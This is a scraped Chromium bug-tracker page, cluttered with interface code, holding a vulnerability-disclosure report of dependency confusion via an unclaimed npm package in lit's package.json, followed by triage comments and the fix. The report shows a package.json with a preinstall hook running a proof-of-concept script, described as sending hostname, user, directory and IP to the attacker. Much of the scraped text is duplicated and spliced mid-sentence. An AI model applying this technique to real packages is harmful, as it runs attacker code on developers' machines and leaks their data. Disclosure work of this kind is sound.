          
          -reward-topanel reward-unpaid reward-1000
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

        mr-phase {
          margin-bottom: 0.75em;

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        for LitElement.

      <style>
        mr-issue-page {

        }

        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;

          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;

          }

            width: 100%;
            padding: 0;
            border: 0;
          }

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }

          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

          Note:<b>Note:</b>
          Clock icons indicate that users may not be available.
          Tooltips show the reason.
          <div id="message"><!---->
          <b>Note:</b>
          Clock icons indicate that users may not be available.
          Tooltips show the reason.
          <!----></div>

confusion<span class="line"><!---->Remote Code Execution(RCE) via Dependency confusion<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Other - Chrome VRP<span class="line"><!---->Other - Chrome VRP<!----></span><br><br><br>#### Which URL have you found the vulnerability in?<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi,<span class="line"><!---->Hi,<!----></span><br><br>I found a [package.json](<span class="line"><!---->I found a class="line"><!---->)<!----></span> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<span class="line"><!----> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" on<span class="line"><!---->I searched this dependency: **internal-scripts** on<!----></span> <span class="line"><!----> <!----></span>npmjs.com<a class="undefined" target="_blank" href="https://npmjs.com"><!---->npmjs.com<!----></a> and it was giving me 404 error, dependency was unclaimed. I made package.json file with the name: internal-scripts and malicious file poc.js  by "npm init" command and published this package on my account.<span class="line"><!----> and it was giving me 404 error, dependency was unclaimed. I made package.json file with the name: internal-scripts and malicious file poc.js  by "npm init" command and published this package on my account.<!----></span><br><br>Steps to Reproduce:<span class="line"><!---->Steps to Reproduce:<!----></span><br>1. Developers mentioned "internal-scripts" in devDependencies section of [package.json](<span class="line"><!---->1. Developers mentioned "internal-scripts" in devDependencies section of [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" href="https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json"><!---->https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<!----></a>)<span class="line"><!---->)<!----></span> file.<span class="line"><!----> file.<!----></span><br>2. This package was unclaimed and i claimed this on public [registery](<span class="line"><!---->2. Go to this link: <span class="line"><!---->3. Go to this link: <!----></span>https://www.npmjs.com/package/internal-scripts<a class="undefined" target="_blank" href="https://www.npmjs.com/package/internal-scripts"><!---->https://www.npmjs.com/package/internal-scripts<!----></a><br>4. You will see this internal-scripts dependency claimed by me.<span class="line"><!---->4. You will see this internal-scripts dependency claimed by me.<!----></span><br>5. attacker able to Remotely execute his code on victim's machine.<span class="line"><!---->5. attacker able to Remotely execute his code on victim's machine.<!----></span><br><br>I uploaded following code in package.json file:<span class="line"><!---->I uploaded following code in package.json file:<!----></span><br><br>{<span class="line"><!---->{<!----></span><br>  "name": "internal-scripts",<span class="line"><!---->  "name": "internal-scripts",<!----></span><br>  "version": class="line"><!---->    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1",<!----></span><br>    "preinstall": "node poc.js"<span class="line"><!---->    "preinstall": "node poc.js"<!----></span><br>  },<span class="line"><!---->  },<!----></span><br>  "author": "",<span class="line"><!---->  "author": "",<!----></span><br>  "license": "ISC"<span class="line"><!---->  "license": "ISC"<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>poc.js file:<span class="line"><!---->poc.js file:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>//author:- @nvk0x<span class="line"><!---->//author:- @nvk0x<!----></span><br>const os = require("os");<span class="line"><!---->const os = require("os");<!----></span><br>const dns = require("dns");<span class="line"><!---->const dns = require("dns");<!----></span><br>const querystring = require("querystring");<span briefly explain who can exploit the vulnerability, and what they gain when doing so<!----></span><br><br>I(attacker) am able to remotly execute code on developers machine. when they use this project and use install dependencies from this project, my malicious(internal-scripts) dependency will install with all the dependecies and poc.js file will run code on victim's machine and will send the hostname, directory, ipaddress, username to attacker.<span class="line"><!---->I(attacker) am able to remotly execute code on developers machine. when they use this project and use install dependencies from this project, my malicious(internal-scripts) dependency will install with all the dependecies and poc.js file will run code on victim's machine and will send the hostname, directory, ipaddress, username to attacker.<!----></span><br><br>Note: **Please see video POC for better explaination**<span class="line"><!---->Note: **Please see video POC for better crash?<!----></span><br><br>No<span class="line"><!---->No<!----></span><br><br><br>#### Choose the type of vulnerability<span class="line"><!---->#### Choose the type of         After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<span class="line"><!---->After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<!----></span><br><br>To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<span class="line"><!---->To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<!----></span><br><br>Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<span class="line"><!---->Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<!----></span><br><br>Assigning this to aomarks@ who added this in <span class="line"><!---->Assigning this to aomarks@ who added this in <!----></span>https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<a class="undefined" target="_blank" href="https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46"><!---->https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<!----></a><mr-comment-content></mr-comment-content>

        I just merged <span class="line"><!---->I just merged <!----></span>https://github.com/lit/lit/pull/3024<a class="undefined" target="_blank" href="https://github.com/lit/lit/pull/3024"><!---->https://github.com/lit/lit/pull/3024<!----></a>,<span class="line"><!---->,<!----></span> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<span class="line"><!----> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<!----></span><mr-comment-content></mr-comment-content>

        Hi calamity@, as per <span class="line"><!---->Hi calamity@, as per <!----></span>https://bugs.chromium.org/p/chromium/issues/detail?id=1332593#c15<a class="undefined" target="_blank" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1332593#c15"><!---->https://bugs.chromium.org/p/chromium/issues/detail?id=1332593#c15<!----></a> the Lit repo no longer has any devDependencies on unregistered packages, so from our side this should be resolved.         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>

    <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>

         * Really specific class names are necessary because ShadowDOM

          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;

        .chops-autocomplete-container tr[data-selected] {

            <textarea id="commentContent" placeholder="Add a comment"></textarea>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">
      
        <slot></slot>
      <label for="checkbox">
        <slot></slot>
      </label>

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>

      ---<span class="line"><!---->---<!----></span><br><br>### Report description<span class="line"><!---->### Report description<!----></span><br><br><br>Remote Code Execution(RCE) via Dependency confusion<span class="line"><!---->Remote Code Execution(RCE) via Dependency confusion<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span vulnerability<!----></span><br><br>Hi,<span class="line"><!---->Hi,<!----></span><br><br>I found a [package.json](<span class="line"><!---->I found a         After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<span class="line"><!---->After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<!----></span><br><br>To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<span class="line"><!---->To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<!----></span><br><br>Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<span class="line"><!---->Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<!----></span><br><br>Assigning this to aomarks@ who added this in <span class="line"><!---->Assigning this to aomarks@ who added this in <!----></span>https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<a class="undefined" target="_blank" href="https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46"><!---->https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<!----></a><mr-comment-content></mr-comment-content>

        I just merged <span class="line"><!---->I just merged <!----></span>https://github.com/lit/lit/pull/3024<a class="undefined" target="_blank" href="https://github.com/lit/lit/pull/3024"><!---->https://github.com/lit/lit/pull/3024<!----></a>,<span class="line"><!---->,<!----></span> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<span class="line"><!----> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<!----></span><mr-comment-content></mr-comment-content>
